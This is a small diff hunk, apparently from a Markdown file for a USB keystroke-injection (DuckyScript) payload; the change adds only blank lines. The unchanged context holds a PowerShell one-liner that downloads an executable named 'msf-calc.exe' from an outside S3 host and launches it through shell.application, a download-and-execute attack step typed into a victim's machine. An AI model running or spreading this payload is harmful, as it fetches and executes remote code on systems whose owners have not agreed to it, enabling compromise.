@@ -31,3 +31,5 @@ DELAY 200
 STRING $down = New-Object System.Net.WebClient; $url = 'http://4a4a8f4331a58e913893a5d58b03221f-redstack.s3.amazonaws.com/msf-calc.exe'; $file = 'msf-calc.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;
 ENTER
 ```
+
+
